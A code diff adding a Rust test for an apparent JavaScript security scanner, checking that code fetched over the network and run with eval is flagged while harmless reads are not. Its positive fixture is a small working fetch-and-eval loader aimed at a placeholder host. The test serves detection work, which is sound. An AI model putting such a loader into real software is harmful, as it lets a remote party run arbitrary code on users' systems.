@@ -1426,6 +1426,50 @@ fn node_http_data_callback_does_not_taint_immediate_code() {
 }
 
 #[test]
+fn fetch_stream_reader_chunks_reach_execution_but_reads_alone_do_not() {
+    let root = temporary_directory("fetch-stream-reader");
+    fs::write(
+        root.join("positive.js"),
+        br#"async function boot() {
+  const response = await fetch('https://example.invalid/control');
+  const reader = response.body.getReader();
+  const { value } = await reader.read();
+  eval(new TextDecoder().decode(value));
+}
+boot();"#,
+    )
+    .unwrap();
+    fs::write(
+        root.join("negative.js"),
+        br#"async function boot() {
+  const response = await fetch('https://example.invalid/content');
+  const reader = response.body.getReader();
+  await reader.read();
+  eval('constant');
+}
+boot();"#,
+    )
+    .unwrap();
+
+    let output = run(&[root.to_str().unwrap(), "--format=json"]);
+
+    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
+    let executions = report["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .filter(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
+        .collect::<Vec<_>>();
+    assert_eq!(executions.len(), 1, "{}", report["findings"]);
+    assert!(
+        executions[0]["evidence"]
+            .to_string()
+            .contains("stream chunk")
+    );
+    fs::remove_dir_all(root).unwrap();
+}
+
+#[test]
 fn promise_function_callbacks_and_static_template_sink_are_traced() {
     let root = temporary_directory("function-callback");
     fs::write(
